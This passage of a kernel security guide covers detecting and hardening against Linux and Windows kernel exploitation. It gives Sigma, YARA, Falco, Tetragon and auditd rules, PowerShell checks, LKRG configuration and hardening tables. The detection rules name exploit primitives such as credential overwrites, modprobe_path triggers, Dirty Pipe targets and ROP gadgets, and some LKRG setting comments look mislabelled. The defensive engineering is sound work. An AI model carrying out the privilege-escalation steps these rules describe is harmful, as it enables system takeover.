Falco, another eBPF-based runtime security project, operates at the syscall layer rather than the kernel-function layer. It detects exploitation artifacts through syscall patterns: unexpected `setuid(0)` calls from non-SUID processes, `mmap` of kernel-address ranges from userspace (a sign of physmap spray setup), and `ptrace(PTRACE_ATTACH)` to privileged processes. The syscall-layer approach is less sensitive than kprobe-based monitoring (it misses kernel-internal operations like direct `cred` modification) but has lower overhead and is compatible with more kernel configurations.

### 11.5 LKRG (Linux Kernel Runtime Guard)

LKRG is an out-of-tree kernel module that provides runtime integrity checking:

Code integrity: LKRG hashes the kernel text section, module text sections, and critical read-only data structures (IDT, system call table, etc.) and periodically verifies the hashes. Any modification triggers an alert or forced kernel panic.

Process integrity: LKRG monitors every task's `struct cred` for unauthorized modifications (as described in §11.2). It detects the `commit_creds(prepare_kernel_cred(0))` primitive as well as direct cred modification.

SELinux/capability integrity: LKRG monitors the `selinux_enforcing` variable and capability bitmasks for unauthorized changes.

LKRG is designed as a detective control (detecting exploitation after the fact) rather than a preventive control. An attacker who achieves kernel code execution can potentially disable LKRG before it detects the exploitation, but this requires knowing LKRG is present and executing the disablement before the next check cycle.

### 11.6 Windows kernel exploit detection

PatchGuard (§9.8) provides periodic integrity checking of critical kernel structures. While it can be evaded, it raises the bar for persistent kernel modifications.

HyperGuard: a newer integrity-monitoring system that runs in VTL 1 (the Secure Kernel) and monitors VTL 0 kernel integrity from a privileged position. Because HyperGuard runs above the normal kernel's privilege level, it cannot be disabled by a VTL 0 compromise. HyperGuard monitors: SSDT integrity, kernel code-page integrity, critical global variable integrity, MSR values, and CR4 register state (preventing SMEP/SMAP disabling). Unlike PatchGuard, which runs at the same privilege level as the kernel it monitors (and can therefore be disabled by a kernel-level attacker), HyperGuard's VTL 1 execution makes it fundamentally more resistant to bypass. An attacker who achieves VTL 0 kernel compromise can modify any VTL 0 memory but cannot reach HyperGuard's code or data in VTL 1. The only bypass is a VTL 0-to-VTL 1 escape (a hypervisor vulnerability), which is the highest-severity vulnerability class on the Windows platform.

ETW kernel-mode tracing: the `Microsoft-Windows-Threat-Intelligence` ETW provider (available to PPL processes) logs kernel-mode exploitation indicators, including: anomalous memory allocations (large kernel-mode allocations from unexpected contexts), token manipulation events, suspicious handle operations, and stack-walk anomalies. Microsoft Defender for Endpoint consumes these events for real-time exploit detection.

Windows Defender Credential Guard telemetry: attempts to access LSASS memory or credential material generate alerts when Credential Guard is active, as the access fails and the failure is logged. Credential Guard also logs attempts to use NTLM authentication when it has been explicitly disabled via policy — an attacker who extracts credentials through a non-VBS-protected path (registry hive extraction, offline NTDS.DIT parsing) and attempts to use NTLM authentication triggers these events. The ETW provider `Microsoft-Windows-NTLM` (Event ID 4013) records NTLM fallback events, providing correlation data for credential-theft detection. The combination of Credential Guard's VTL 1 isolation and its diagnostic telemetry creates a defense-in-depth posture where even partial bypass attempts generate detection signals.

### 11.7 Windows kernel exploitation detection: ETW and PowerShell

The following ETW queries and PowerShell verification scripts operationalize Windows kernel exploit detection for blue-team deployment.

**ETW: Kernel audit for EPROCESS token manipulation.** The `Microsoft-Windows-Kernel-Audit-API-Calls` provider (GUID `{e02a841c-75a3-4fa7-afc8-ae09cf9b7f23}`) records kernel API activity including handle operations on process objects. When an attacker performs token stealing (section 10.1), the token pointer modification itself is invisible to ETW (it occurs via direct memory write), but the subsequent use of the stolen token generates observable events. The following xperf trace captures process-object handle operations that correlate with token manipulation:

```powershell
# Start kernel audit trace for process-token related events
xperf -on PROC_THREAD+LOADER+PROFILE -stackwalk Profile -f kernel_audit.etl
# Alternative: targeted ETW session
logman create trace "KernelExploitMonitor" -p "Microsoft-Windows-Kernel-Audit-API-Calls" 0xFFFFFFFF 0xFF -o C:\Traces\kernel_audit.etl -ets
logman start "KernelExploitMonitor" -ets

# Query for anomalous token operations (post-capture analysis)
# Look for OpenProcess with PROCESS_QUERY_INFORMATION to PID 4 (System)
Get-WinEvent -LogName "Security" -FilterHashtable @{Id=4656} |
    Where-Object { $_.Properties[6].Value -match "System" -and
                   $_.Properties[9].Value -match "0x0400" } |
    Select-Object TimeCreated, @{N='ProcessName';E={$_.Properties[0].Value}},
                  @{N='TargetProcess';E={$_.Properties[6].Value}}
```

**ETW: Credential Guard bypass monitoring.** When Credential Guard is active, attempts to read LSASS memory produce distinctive ETW events. The `Microsoft-Windows-LSASS` provider logs access attempts, and the `Microsoft-Windows-Security-Mitigations` provider logs attempted bypasses:

```powershell
# Verify Credential Guard is active
$dg = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
Write-Host "VBS Status: $($dg.VirtualizationBasedSecurityStatus)"
Write-Host "Credential Guard: $($dg.SecurityServicesRunning -contains 1)"
Write-Host "HVCI: $($dg.SecurityServicesRunning -contains 2)"

# Monitor for credential access attempts
Get-WinEvent -LogName "Microsoft-Windows-LSASS/Operational" -MaxEvents 100 |
    Where-Object { $_.Id -in @(300, 301, 302) } |
    Format-Table TimeCreated, Id, Message -AutoSize
```

**HVCI enforcement verification.** Operators should periodically verify that HVCI has not been downgraded or disabled (an attacker with physical access or a firmware vulnerability might alter boot configuration):

```powershell
# Full VBS/HVCI/CG status check
function Test-KernelHardening {
    $dg = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
    $results = [ordered]@{
        "VBS Status"               = switch ($dg.VirtualizationBasedSecurityStatus) {
                                        0 {"Disabled"} 1 {"Enabled (not running)"} 2 {"Running"} }
        "HVCI Running"             = ($dg.SecurityServicesRunning -contains 2)
        "Credential Guard Running" = ($dg.SecurityServicesRunning -contains 1)
        "Secure Boot"              = (Confirm-SecureBootUEFI -ErrorAction SilentlyContinue)
        "Kernel DMA Protection"    = ($dg.SecurityServicesConfigured -contains 3)
        "System Guard"             = ($dg.SecurityServicesRunning -contains 3)
    }
    # Check Kernel Shadow Stack (CET)
    $cetKey = "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\KernelShadowStacks"
    if (Test-Path $cetKey) {
        $results["Kernel CET SHSTK"] = (Get-ItemProperty $cetKey).Enabled -eq 1
    }
    $results.GetEnumerator() | ForEach-Object {
        [PSCustomObject]@{ Check = $_.Key; Status = $_.Value }
    } | Format-Table -AutoSize
}
Test-KernelHardening
```

**PatchGuard / HyperGuard evasion detection.** PatchGuard evasion produces indirect signals: if an attacker disables PatchGuard to install a persistent kernel hook, the absence of PatchGuard timer events is itself detectable. The `Microsoft-Windows-Kernel-Processor-Power` provider records context switches that include PatchGuard's deferred procedure calls (DPCs). A period without PatchGuard DPC events longer than the maximum check interval (~15 minutes) is anomalous:

```powershell
# Check for recent CRITICAL_STRUCTURE_CORRUPTION bugchecks
Get-WinEvent -LogName "System" -FilterHashtable @{Id=1001; ProviderName="Microsoft-Windows-WER-SystemErrorReporting"} -MaxEvents 20 |
    Where-Object { $_.Message -match "0x00000109" } |
    Select-Object TimeCreated, Message |
    Format-List
```

### 11.8 Detection engineering: Sigma rules for kernel exploitation

The following Sigma rules detect kernel exploitation artifacts on Linux systems. Each rule targets a specific indicator from the exploitation techniques described in sections 1-8.

**Rule 1 — Kernel oops/panic from exploitation attempt (crash-based detection):**

```yaml
title: Suspicious Kernel Oops Indicating Exploitation Attempt
id: 8a3f2c01-d7e4-4b1a-9c3f-1e5d7a2b4c6e
status: experimental
description: >
  Detects kernel oops messages that contain patterns consistent with
  kernel exploitation: ROP chain artifacts (sequential small gadget addresses),
  SMEP/SMAP violations, and NULL pointer dereferences in sensitive code paths.
references:
  - https://www.kernel.org/doc/html/latest/admin-guide/bug-hunting.html
logsource:
  product: linux
  service: syslog
detection:
  selection_oops:
    - message|contains: "BUG: unable to handle page fault"
    - message|contains: "kernel BUG at"
    - message|contains: "general protection fault"
  selection_smep:
    message|contains: "SMEP"
  selection_smap:
    message|contains:
      - "SMAP"
      - "supervisor read access in user space"
  selection_rip_user:
    message|re: "RIP:.*0x0000[0-7]"
  condition: selection_oops and (selection_smep or selection_smap or selection_rip_user)
level: critical
tags:
  - attack.privilege_escalation
  - attack.t1068
falsepositives:
  - Buggy kernel drivers with legitimate SMAP violations (rare)
```

**Rule 2 — Credential manipulation via auditd (commit_creds from unexpected path):**

```yaml
title: Unexpected UID Change Without Legitimate Auth Path
id: 2b7d4e19-a6c3-48f5-b2d1-3f8e9c1a5d7b
status: experimental
description: >
  Detects processes that transition from non-root UID to UID 0 without going
  through a legitimate privilege-transition syscall (setuid binary, su, sudo,
  pkexec). Indicates potential kernel exploit commit_creds abuse.
logsource:
  product: linux
  service: auditd
detection:
  selection:
    type: SYSCALL
    key: priv_esc_monitor
  filter_legitimate:
    exe|contains:
      - "/usr/bin/su"
      - "/usr/bin/sudo"
      - "/usr/bin/pkexec"
      - "/usr/bin/newgrp"
      - "/usr/sbin/unix_chkpwd"
      - "/usr/lib/polkit"
  filter_uid_change:
    auid: "!0"
    euid: "0"
  condition: selection and filter_uid_change and not filter_legitimate
level: critical
tags:
  - attack.privilege_escalation
  - attack.t1068
  - cve.2023.32233
  - cve.2024.1086
falsepositives:
  - Custom SUID binaries not in the whitelist
  - Container runtime privilege transitions
```

**Rule 3 — Suspicious modprobe_path / core_pattern trigger sequence:**

```yaml
title: Unknown Binary Format Execution After Suspicious Write
id: 5e1a3c8d-b2f7-4d96-a1e5-9c7b3f2d8a4e
status: experimental
description: >
  Detects the modprobe_path exploitation pattern: execution of a file with
  unknown binary format (triggering call_modprobe) shortly after a write to
  /tmp or other writable directories. The kernel invokes the binary at
  modprobe_path when encountering unknown binfmt headers.
logsource:
  product: linux
  service: auditd
detection:
  selection_exec_unknown:
    type: EXECVE
    a0|re: "^/tmp/|^/dev/shm/|^/var/tmp/"
  selection_binfmt:
    type: PROCTITLE
    proctitle|contains: "\xff\xff\xff\xff"
  selection_exec_root_context:
    type: SYSCALL
    syscall: execve
    uid: "0"
    ppid: "2"  # kthreadd - parent of kernel worker threads
  condition: selection_exec_root_context or (selection_exec_unknown and selection_binfmt)
level: critical
tags:
  - attack.privilege_escalation
  - attack.t1068
falsepositives:
  - Legitimate modprobe invocations (these use /sbin/modprobe, not /tmp paths)
```

### 11.9 Detection engineering: YARA rules for kernel exploit artifacts

These YARA rules detect kernel exploit artifacts in memory dumps, process memory, and on-disk exploit binaries.

**Rule 1 — Kernel ROP chain in process memory:**

```text
rule kernel_rop_chain_artifact
{
    meta:
        description = "Detects ROP chain arrays targeting kernel functions in process memory"
        severity = "critical"
        mitre_attack = "T1068"

    strings:
        // commit_creds / prepare_kernel_cred function name strings
        $fn_commit = "commit_creds" ascii
        $fn_prepare = "prepare_kernel_cred" ascii
        $fn_swapgs = "swapgs_restore_regs_and_return_to_usermode" ascii
        $fn_modprobe = "modprobe_path" ascii

        // Kernel address patterns (0xffffffff8XXXXXXX range)
        $kaddr = { ff ff ff ff 8? ?? ?? ?? }

        // Common stack pivot gadgets encoded as byte sequences
        // xchg rax, rsp; ret
        $pivot_xchg = { 48 94 c3 }
        // mov rsp, rax; ret  (various encodings)
        $pivot_mov = { 48 89 c4 c3 }

        // pop rdi; ret (used to set first argument)
        $pop_rdi = { 5f c3 }

        // swapgs; ret
        $swapgs_ret = { 0f 01 f8 c3 }

    condition:
        (2 of ($fn_*)) or
        ($kaddr and ($pivot_xchg or $pivot_mov) and $pop_rdi) or
        (3 of ($kaddr*) at (0..8) and $swapgs_ret)
}
```

**Rule 2 — Dirty Pipe exploit binary:**

```text
rule dirty_pipe_exploit_cve_2022_0847
{
    meta:
        description = "Detects Dirty Pipe (CVE-2022-0847) exploit binaries"
        severity = "critical"
        cve = "CVE-2022-0847"

    strings:
        $splice_call = "splice" ascii
        $pipe_call = "pipe" ascii
        $open_ro = { bf 00 00 00 00 }  // O_RDONLY = 0
        $flag_pattern = "PIPE_BUF_FLAG_CAN_MERGE" ascii
        $passwd_target = "/etc/passwd" ascii
        $shadow_target = "/etc/shadow" ascii
        $suid_target = "/usr/bin/su" ascii

        // The characteristic fill-drain-splice-write sequence
        $seq_fill = "write(fd[1]" ascii
        $seq_drain = "read(fd[0]" ascii
        $seq_splice_write = { e8 [4] 48 89 c7 e8 }  // call splice; mov rdi,rax; call write pattern

    condition:
        uint32(0) == 0x464c457f and  // ELF magic
        $splice_call and $pipe_call and
        ($flag_pattern or (($passwd_target or $shadow_target or $suid_target) and $seq_splice_write) or
         ($seq_fill and $seq_drain and $splice_call))
}
```

**Rule 3 — Cross-cache heap spray artifact in memory dump:**

```text
rule kernel_cross_cache_spray_indicators
{
    meta:
        description = "Detects cross-cache heap spray patterns in kernel crash dumps"
        severity = "high"
        mitre_attack = "T1068"

    strings:
        // msg_msg header signature: m_type followed by m_ts (common spray sizes)
        // struct msg_msg { struct list_head m_list; long m_type; size_t m_ts; ... }
        $msg_header_64 = { 01 00 00 00 00 00 00 00 [8] 00 01 00 00 00 00 00 00 }
        $msg_header_256 = { 01 00 00 00 00 00 00 00 [8] 00 04 00 00 00 00 00 00 }
        $msg_header_1024 = { 01 00 00 00 00 00 00 00 [8] 00 08 00 00 00 00 00 00 }

        // Repeated seq_operations pointer pattern (4 identical function pointers)
        $seq_ops = { ff ff ff ff 8? ?? ?? ?? ff ff ff ff 8? ?? ?? ?? ff ff ff ff 8? ?? ?? ?? ff ff ff ff 8? ?? ?? ?? }

        // pipe_buffer ops pointer pattern
        $pipe_ops = { ff ff ff ff [4] 00 00 00 00 00 00 00 00 }

        // Spray indicator: many identical 8-byte values in sequence (heap spray)
        $spray_pattern = { (?? ?? ?? ?? ?? ?? ff ff) (?? ?? ?? ?? ?? ?? ff ff) (?? ?? ?? ?? ?? ?? ff ff) (?? ?? ?? ?? ?? ?? ff ff) }

    condition:
        (#msg_header_64 > 50 or #msg_header_256 > 50 or #msg_header_1024 > 50) or
        (#seq_ops > 20) or
        (#spray_pattern > 100 and $pipe_ops)
}
```

### 11.10 Detection engineering: eBPF / Tetragon / Falco policies

**Tetragon TracingPolicy for `commit_creds` monitoring.** This policy attaches a kprobe to `commit_creds` and logs the call stack. Calls from unexpected kernel paths generate critical alerts:

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: detect-kernel-cred-manipulation
spec:
  kprobes:
    - call: "commit_creds"
      syscall: false
      return: false
      args:
        - index: 0
          type: "nop"
      selectors:
        - matchActions:
            - action: Post
              rateLimit: "1m"
              rateLimitScope: "thread"
            - action: Signal
              argSig: 9
      returnarg:
        index: 0
        type: "int"
    - call: "prepare_kernel_cred"
      syscall: false
      return: true
      args:
        - index: 0
          type: "nop"
      returnarg:
        index: 0
        type: "nop"
    - call: "__x64_sys_setuid"
      syscall: true
      args:
        - index: 0
          type: "int"
    - call: "call_usermodehelper"
      syscall: false
      args:
        - index: 0
          type: "string"
        - index: 2
          type: "int"
      selectors:
        - matchArgs:
            - index: 0
              operator: "NotPrefix"
              values:
                - "/sbin/modprobe"
                - "/sbin/request-key"
          matchActions:
            - action: Post
```

**Falco rules for kernel exploitation indicators:**

```yaml
- rule: Unexpected Privilege Escalation to Root
  desc: >
    Detects a process changing its effective UID to 0 (root) without going
    through a known authentication binary. Covers kernel exploit
    commit_creds(prepare_kernel_cred(0)) abuse.
  condition: >
    evt.type = setuid and evt.arg.uid = 0 and
    not proc.name in (su, sudo, pkexec, login, sshd, cron, crond, at, batch) and
    not proc.pname in (su, sudo, pkexec, login, sshd, cron, crond, systemd)
  output: >
    Unexpected UID 0 transition (user=%user.name command=%proc.cmdline
    parent=%proc.pname container=%container.id pid=%proc.pid)
  priority: CRITICAL
  tags: [privilege_escalation, T1068, kernel_exploit]

- rule: Suspicious modprobe_path Trigger
  desc: >
    Detects execution of binaries from world-writable directories by
    kernel worker threads, indicating modprobe_path or core_pattern exploit.
  condition: >
    spawned_process and proc.ppid = 2 and
    (proc.exepath startswith "/tmp/" or
     proc.exepath startswith "/dev/shm/" or
     proc.exepath startswith "/var/tmp/")
  output: >
    Kernel worker spawned suspicious binary (command=%proc.cmdline
    parent=%proc.pname path=%proc.exepath pid=%proc.pid)
  priority: CRITICAL
  tags: [privilege_escalation, T1068, modprobe_path]

- rule: Kernel Module Load From Non-Standard Path
  desc: Detects kernel module loading from paths outside /lib/modules.
  condition: >
    evt.type in (init_module, finit_module) and
    not fd.name startswith "/lib/modules/"
  output: >
    Kernel module loaded from non-standard path (user=%user.name
    command=%proc.cmdline path=%fd.name container=%container.id)
  priority: HIGH
  tags: [persistence, T1547.006, rootkit]
```

### 11.11 Detection engineering: auditd rules for kernel exploitation

The following auditd rule set provides comprehensive monitoring for kernel exploitation indicators. Deploy via `/etc/audit/rules.d/90-kernel-exploit.rules`:

```bash
# === Kernel Exploitation Detection - auditd Rules ===

# Monitor privilege escalation: any setuid/setgid to root from non-root
-a always,exit -F arch=b64 -S setuid -S setreuid -S setresuid -F a0=0 -F auid!=0 -F key=priv_esc_monitor
-a always,exit -F arch=b64 -S setgid -S setregid -S setresgid -F a0=0 -F auid!=0 -F key=priv_esc_monitor

# Monitor kernel module operations
-a always,exit -F arch=b64 -S init_module -S finit_module -S delete_module -F key=kernel_module_ops
-w /sbin/modprobe -p x -k modprobe_exec
-w /sbin/insmod -p x -k module_tools
-w /sbin/rmmod -p x -k module_tools

# Monitor kexec (kernel replacement)
-a always,exit -F arch=b64 -S kexec_load -S kexec_file_load -F key=kexec_attempt

# Monitor ptrace (process injection / debugging)
-a always,exit -F arch=b64 -S ptrace -F a0=0x4 -F key=ptrace_inject  # PTRACE_ATTACH
-a always,exit -F arch=b64 -S ptrace -F a0=0x10 -F key=ptrace_inject # PTRACE_SEIZE

# Monitor splice (Dirty Pipe indicator when combined with pipe write)
-a always,exit -F arch=b64 -S splice -S tee -F key=splice_monitor

# Monitor userfaultfd (exploitation stalling primitive)
-a always,exit -F arch=b64 -S userfaultfd -F key=userfaultfd_create

# Monitor unshare / clone with new namespaces (container escape)
-a always,exit -F arch=b64 -S unshare -F key=namespace_ops
-a always,exit -F arch=b64 -S clone3 -F a2&0x7e020000 -F key=namespace_clone

# Monitor access to sensitive kernel interfaces
-w /proc/sys/kernel/core_pattern -p wa -k core_pattern_modify
-w /proc/sys/kernel/modprobe -p wa -k modprobe_path_modify
-w /proc/sys/kernel/poweroff_cmd -p wa -k poweroff_cmd_modify

# Monitor writes to /proc/sysrq-trigger
-w /proc/sysrq-trigger -p w -k sysrq_trigger

# Monitor BPF operations (eBPF exploitation surface)
-a always,exit -F arch=b64 -S bpf -F key=bpf_ops

# Monitor perf_event_open (KASLR bypass via perf)
-a always,exit -F arch=b64 -S perf_event_open -F key=perf_event_monitor

# Monitor io_uring (expanding exploitation surface)
-a always,exit -F arch=b64 -S io_uring_setup -S io_uring_enter -S io_uring_register -F key=io_uring_ops

# Monitor nftables operations (CVE-2023-32233, CVE-2024-1086 trigger path)
-a always,exit -F arch=b64 -S sendmsg -F a0=0xa -F key=netfilter_ops  # AF_NETLINK

# Monitor access to /dev/mem, /dev/kmem (direct physical memory)
-w /dev/mem -p rw -k devmem_access
-w /dev/kmem -p rw -k devkmem_access
```

### 11.12 LKRG deployment and configuration reference

LKRG (Linux Kernel Runtime Guard) is deployed as an out-of-tree kernel module. The following covers operational deployment.

**Installation and loading:**

```bash
# Build from source (DKMS-based)
git clone https://github.com/lkrg-org/lkrg.git
cd lkrg
make -j$(nproc)
# Load with enforcement enabled
insmod output/lkrg.ko lkrg.profile_enforce=2

# Verify loaded
dmesg | grep -i lkrg
cat /sys/kernel/security/lkrg/profiles
```

**Runtime configuration via sysctl (`/etc/sysctl.d/99-lkrg.conf`):**

```bash
# LKRG enforcement profile: 0=log, 1=log+kill, 2=log+kill+panic
lkrg.profile_enforce = 2

# Code integrity check interval (seconds)
lkrg.interval = 15

# Process credential validation: 0=off, 1=validate cred integrity
lkrg.pint_enforce = 2

# SELinux state monitoring: 1=enabled
lkrg.selinux_enforce = 1

# Module loading monitoring: 1=log, 2=block unsigned
lkrg.msr_enforce = 1

# Kernel .text integrity check: 1=enabled
lkrg.kint_enforce = 1

# Block new module insertion (post-boot lockdown)
lkrg.block_modules = 1
```

LKRG's `pint_enforce=2` mode (process integrity enforcement at panic level) catches the `commit_creds(prepare_kernel_cred(0))` primitive and direct `cred` structure manipulation because it validates each task's `cred` against the expected state at every check interval. An attacker who modifies credentials must also disable LKRG before the next check cycle — a 15-second window that significantly raises the exploitation bar. LKRG is not a preventive control (it cannot stop the initial write), but it converts a silent privilege escalation into a detected and optionally fatal event.

---

## 12. Combined defense posture and residual attack surface

### 12.1 Linux hardened configuration

A fully hardened Linux kernel deployment includes:

KASLR + KPTI + SMEP + SMAP + kernel CET IBT (if hardware supports) + seccomp on all user processes + AppArmor/SELinux in enforcing mode + `kptr_restrict=2` + `kernel.unprivileged_bpf_disabled=1` + `kernel.unprivileged_userns_clone=0` + `kernel.perf_event_paranoid=3` + `lockdown=confidentiality` + `init_on_alloc=1` + `init_on_free=1` + LKRG or equivalent runtime monitoring.

Residual attack surface: the attacker needs a kernel vulnerability that provides both an information leak (for KASLR bypass) and a write primitive (for privilege escalation), must stage all exploit data in kernel space (SMAP blocks user-space data), must avoid control-flow corruption (kernel CET IBT), must use a data-only attack path (modprobe_path, cred modification, or similar), and the result must survive LKRG's integrity checks. This is a high bar — but it is not insurmountable, as demonstrated by the continuing stream of kernel privilege-escalation CVEs.

The following tables provide an exhaustive reference for kernel hardening across sysctl tunables, boot parameters, kernel configuration options, and compiler plugin hardening.

#### 12.1.1 Sysctl hardening settings

| Sysctl | Recommended Value | Effect | Bypass Blocked |
|--------|-------------------|--------|----------------|
| `kernel.kptr_restrict` | `2` | Hides all kernel pointers, even from root, via `%pK` | KASLR bypass via `/proc/kallsyms` |
| `kernel.dmesg_restrict` | `1` | Restricts `dmesg` to `CAP_SYSLOG` | Kernel pointer leaks from ring buffer |
| `kernel.perf_event_paranoid` | `3` | Disables `perf_event_open` for unprivileged users | KASLR bypass via perf sample IP |
| `kernel.unprivileged_bpf_disabled` | `1` | Blocks unprivileged eBPF program loading | eBPF verifier bypass, JIT spray |
| `kernel.unprivileged_userns_clone` | `0` | Blocks unprivileged user namespace creation | Namespace-based attack surface expansion |
| `vm.unprivileged_userfaultfd` | `0` | Restricts userfaultfd to privileged users | Race condition stalling primitive |
| `kernel.yama.ptrace_scope` | `2` (admin-only) | Restricts ptrace to `CAP_SYS_PTRACE` | Process memory inspection / injection |
| `kernel.io_uring_disabled` | `2` | Disables io_uring for unprivileged users | io_uring exploitation surface (CVE-2024-0582 etc.) |
| `kernel.kexec_load_disabled` | `1` | Prevents kexec after boot | Kernel replacement for rootkit persistence |
| `kernel.modules_disabled` | `1` (post-boot) | Prevents module loading after set | Rootkit module insertion |
| `kernel.sysrq` | `0` | Disables all SysRq functions | Physical/serial console abuse |
| `net.core.bpf_jit_harden` | `2` | Hardens BPF JIT (constant blinding, no insn leaks) | JIT spray gadget planting |
| `kernel.randomize_va_space` | `2` | Full ASLR (stack, mmap, heap randomization) | User-space address prediction |
| `kernel.ftrace_enabled` | `0` (production) | Disables ftrace framework | Ftrace-based kernel function hooking |
| `kernel.unprivileged_bpf_disabled` + `net.core.bpf_jit_enable` | `1` / `0` | Combined: no unpriv BPF, no JIT for remaining | Full eBPF attack surface elimination |
| `fs.protected_symlinks` | `1` | Prevents following symlinks in world-writable dirs | Symlink-based privilege escalation |
| `fs.protected_hardlinks` | `1` | Prevents creating hardlinks to non-owned files | Hardlink-based file clobbering |
| `fs.protected_fifos` | `2` | Restricts FIFO creation in sticky directories | FIFO race conditions |
| `fs.protected_regular` | `2` | Restricts regular file creation in sticky directories | Regular file race conditions |
| `fs.suid_dumpable` | `0` | Prevents core dumps from SUID binaries | Credential leaks from core files |
| `kernel.panic_on_oops` | `1` | Kernel panics on oops rather than continuing | Prevents attacker retry after failed exploit |
| `kernel.printk` | `3 3 3 3` | Reduces console logging verbosity | Kernel pointer leaks from console output |
| `net.ipv4.conf.all.rp_filter` | `1` | Enables strict reverse-path filtering | IP spoofing for kernel network stack attacks |
| `kernel.core_uses_pid` | `1` | Appends PID to core file names | Core file overwrite attacks |
| `kernel.sched_child_runs_first` | `0` | Default scheduling; avoid fork-bomb scenarios | Not directly exploit-related but stability |
| `vm.mmap_min_addr` | `65536` | Prevents mapping the NULL page and low addresses | NULL pointer dereference exploitation |
| `dev.tty.ldisc_autoload` | `0` | Prevents automatic line discipline loading | Line discipline vulnerability trigger (CVE-2023-0386 class) |
| `kernel.unprivileged_bpf_disabled` | `2` (permanent) | Same as `1` but cannot be re-enabled without reboot | Prevents runtime BPF re-enablement |
| `kernel.lockdown` | `confidentiality` | Prevents reading kernel memory and modifying runtime state | Direct KASLR defeat, module loading, kexec |

#### 12.1.2 Boot parameter hardening

| Parameter | Effect | Bypass Blocked |
|-----------|--------|----------------|
| `init_on_alloc=1` | Zero-fills heap allocations at alloc time | Info leaks from uninitialized slab objects |
| `init_on_free=1` | Zero-fills heap memory at free time | Use-after-free data recovery |
| `slab_nomerge` | Prevents merging of slab caches with similar sizes | Cross-cache attacks that rely on merged caches |
| `page_alloc.shuffle=1` | Randomizes page allocator free lists | Deterministic page-level heap feng shui |
| `randomize_kstack_offset=on` | Randomizes kernel stack offset per syscall | Stack-based info leaks, stack buffer overflows |
| `lockdown=confidentiality` | Kernel lockdown mode (strictest) | Module loading, kexec, direct HW access, `/dev/mem` |
| `vsyscall=none` | Disables vsyscall page entirely | Removes fixed-address ROP gadgets at 0xFFFFFFFFFF600000 |
| `debugfs=off` | Disables debugfs mount | Kernel pointer leaks via debugfs entries |
| `iommu=force` | Forces IOMMU for all devices | DMA-based physical memory access attacks |
| `efi=disable_early_pci_dma` | Blocks PCI DMA before IOMMU is initialized | Pre-boot DMA attacks |
| `pti=on` | Forces KPTI even on non-Meltdown-affected CPUs | Residual KASLR leaks from kernel page table |
| `spectre_v2=on` | Enables full Spectre v2 mitigations | Branch predictor-based KASLR bypass |
| `l1tf=full,force` | Full L1TF mitigations | L1 Terminal Fault cross-VM data leaks |
| `mds=full,nosmt` | Full MDS mitigations with SMT disabled | Microarchitectural Data Sampling |
| `kfence.sample_interval=100` | Enables KFENCE with 100ms sampling | Detects heap OOB and UAF at runtime |
| `mitigations=auto,nosmt` | Apply all CPU vulnerability mitigations, disable SMT | Comprehensive speculative execution mitigations |

#### 12.1.3 Kernel configuration options

| Config Option | Effect | Bypass Blocked |
|---------------|--------|----------------|
| `CONFIG_SLAB_FREELIST_HARDENED=y` | Mangles freelist pointers with XOR + random cookie | Freelist pointer overwrite for heap exploitation |
| `CONFIG_SLAB_FREELIST_RANDOM=y` | Randomizes initial freelist ordering | Deterministic slab layout prediction |
| `CONFIG_SHUFFLE_PAGE_ALLOCATOR=y` | Randomizes page allocator output | Page-level heap feng shui (CVE-2024-1086 class) |
| `CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y` | Compile-time default for `init_on_alloc=1` | Same as boot parameter, but cannot be disabled |
| `CONFIG_INIT_ON_FREE_DEFAULT_ON=y` | Compile-time default for `init_on_free=1` | Same as boot parameter, but cannot be disabled |
| `CONFIG_HARDENED_USERCOPY=y` | Validates `copy_from_user`/`copy_to_user` bounds | Slab object boundary overflows via usercopy |
| `CONFIG_FORTIFY_SOURCE=y` | Compile-time + runtime buffer overflow checks for string/mem ops | `memcpy`/`strcpy` overflows in kernel code |
| `CONFIG_CFI_CLANG=y` | Clang-based forward-edge CFI for indirect calls | Indirect call hijack (vtable, ops pointer corruption) |
| `CONFIG_SHADOW_CALL_STACK=y` (AArch64) | Shadow call stack for return address protection | Kernel ROP via return address overwrite |
| `CONFIG_STACKPROTECTOR_STRONG=y` | Stack canary on all functions with local variables | Stack buffer overflow exploitation |
| `CONFIG_STRICT_KERNEL_RWX=y` | Enforces W^X on kernel text/rodata | Code injection into kernel text pages |
| `CONFIG_STRICT_MODULE_RWX=y` | Enforces W^X on module text/rodata | Code injection into module pages |
| `CONFIG_RANDOM_KMALLOC_CACHES=y` (6.6+) | Splits each kmalloc size-class into multiple random caches | Cross-cache attacks become probabilistic |
| `CONFIG_LIST_HARDENED=y` (6.1+) | Validates linked-list integrity on insert/remove | List corruption for arbitrary write |
| `CONFIG_BUG_ON_DATA_CORRUPTION=y` | Kernel panics on detected data corruption | Prevents continued execution after partial exploit |
| `CONFIG_SECURITY_DMESG_RESTRICT=y` | Compile-time default for `kernel.dmesg_restrict=1` | Cannot be overridden at runtime |
| `CONFIG_DEBUG_CREDENTIALS=y` | Adds runtime credential sanity checks | Detects `cred` corruption from data-only attacks |
| `CONFIG_LOCK_DOWN_KERNEL_FORCE_CONFIDENTIALITY=y` | Compile-time lockdown (cannot be disabled) | All lockdown-blocked vectors |
| `CONFIG_STATIC_USERMODEHELPER=y` | Restricts `call_usermodehelper` to a single path | `modprobe_path` / `core_pattern` overwrite |
| `CONFIG_SECURITY_LOADPIN=y` | Restricts kernel file loads to one filesystem | Rootkit loading from attacker-controlled mounts |

#### 12.1.4 GCC/Clang plugin hardening

| Plugin / Feature | Config Option | Effect | Bypass Blocked |
|-----------------|---------------|--------|----------------|
| RANDSTRUCT | `CONFIG_GCC_PLUGIN_RANDSTRUCT=y` | Randomizes layout of marked structures (`task_struct`, `cred`, etc.) per build | Offset-based data-only attacks (require per-target calibration) |
| STACKLEAK | `CONFIG_GCC_PLUGIN_STACKLEAK=y` | Erases kernel stack on syscall return | Stack info leaks across syscall boundaries |
| LATENT_ENTROPY | `CONFIG_GCC_PLUGIN_LATENT_ENTROPY=y` | Seeds PRNG from compile-time random structure initialization | Weak early-boot entropy for KASLR |
| STRUCTLEAK (byref_all) | `CONFIG_GCC_PLUGIN_STRUCTLEAK_BYREF_ALL=y` | Force-initializes all stack variables passed by reference | Uninitialized stack variable leaks |

